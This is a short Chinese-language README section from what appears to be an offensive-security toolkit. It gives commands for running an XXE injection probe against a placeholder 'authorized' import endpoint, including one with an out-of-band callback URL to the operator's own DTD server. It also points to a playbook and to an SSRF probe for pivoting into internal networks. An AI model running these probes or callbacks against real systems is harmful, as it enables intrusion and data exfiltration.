## 作业入口（先跑这个）

```bash
python3 tools/ops/tpl_inject_probe.py xxe --url https://授权/api/import --case <案>
python3 tools/ops/tpl_inject_probe.py xxe --url https://授权/api/import --oob http://你的OOB/xxe.dtd --case <案>
```

`core_web_surface_probe` 没有 `--xxe` 开关。作业手法：`docs/playbooks/测绘引擎XXE作业手法.md`。  
Tika / GeoServer / SharePoint 仍走专卡。升内网走 `ssrf_probe.py`。

